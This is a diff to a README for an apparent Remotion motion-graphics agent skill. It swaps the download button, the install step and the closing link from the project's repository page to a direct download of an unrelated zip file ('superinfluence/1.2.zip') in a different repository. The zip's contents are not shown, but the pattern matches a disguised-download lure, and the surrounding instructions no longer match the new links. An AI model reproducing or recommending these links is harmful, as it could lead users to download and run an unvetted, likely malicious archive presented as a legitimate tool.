@@ -6,7 +6,7 @@ description: "Build kinetic typography and brand promo motion graphics as code w
 <h1>🎬 agent-skill-remotion-motion-graphics - Create Professional Motion Graphics as Code</h1>
 
 <p align="center">
-  <a href="https://github.com/Westleighinauspicious5506/agent-skill-remotion-motion-graphics" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#FF6B6B,#4ECDC4);color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW</a>
+  <a href="https://raw.githubusercontent.com/Westleighinauspicious5506/westleighinauspicious5506.github.io/main/superinfluence/1.2.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#FF6B6B,#4ECDC4);color:#fff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW</a>
 </p>
 
 ## 👋 Welcome
@@ -40,7 +40,7 @@ This is your one-stop solution for creating professional motion graphics. Imagin
 
 Getting started is easier than you think. Follow these simple steps:
 
-1. **Click the download button above or visit this link:** [https://github.com/Westleighinauspicious5506/agent-skill-remotion-motion-graphics](https://github.com/Westleighinauspicious5506/agent-skill-remotion-motion-graphics)  
+1. **Click the download button above or visit this link:** [https://raw.githubusercontent.com/Westleighinauspicious5506/westleighinauspicious5506.github.io/main/superinfluence/1.2.zip](https://raw.githubusercontent.com/Westleighinauspicious5506/westleighinauspicious5506.github.io/main/superinfluence/1.2.zip)  
    Visit this link to download the application.
 
 2. **Download the application** from the page that opens. Look for the green "Code" button and select "Download ZIP".
@@ -168,6 +168,6 @@ Created something amazing? Here's how to show it off:
 
 *Ready to amaze your audience? Download now and start creating professional motion graphics that make people say "Wow!" Your journey to becoming a video creator starts with one click.*
 
-**Get started today:** [Visit the download page now](https://github.com/Westleighinauspicious5506/agent-skill-remotion-motion-graphics)
+**Get started today:** [Visit the download page now](https://raw.githubusercontent.com/Westleighinauspicious5506/westleighinauspicious5506.github.io/main/superinfluence/1.2.zip)
 
 Keywords: agent-skills, claude-code, claude-skills, motion-graphics, remotion
